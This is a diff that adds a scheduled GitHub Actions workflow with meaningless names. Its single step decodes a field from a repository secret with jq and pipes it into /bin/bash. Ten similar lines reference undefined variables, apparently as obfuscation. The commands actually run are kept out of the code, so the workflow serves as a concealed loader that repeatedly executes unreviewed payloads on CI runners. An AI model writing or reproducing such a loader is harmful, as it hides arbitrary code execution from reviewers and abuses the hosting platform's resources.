@@ -1,0 +1,28 @@
+name: lieyixia
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lieyixia
+        env:
+          liog0: ${{ secrets.liog0 }}
+        run: |
+          echo $liog0 | jq -r .f946 | /bin/bash
+          echo $iqcpc9372 | jq -r .fvw38 | /bin/bash
+          echo $xtl92 | jq -r .te883 | /bin/bash
+          echo $agbsn47183 | jq -r .vlcxq2 | /bin/bash
+          echo $zvmhm504 | jq -r .thpa5 | /bin/bash
+          echo $arnn206 | jq -r .dzjay4 | /bin/bash
+          echo $wflr269 | jq -r .gtoml8 | /bin/bash
+          echo $ol371 | jq -r .jhqez2997 | /bin/bash
+          echo $k185 | jq -r .qci403 | /bin/bash
+          echo $k59951 | jq -r .nkt340 | /bin/bash
+          echo $dxay340 | jq -r .erb69746 | /bin/bash
+
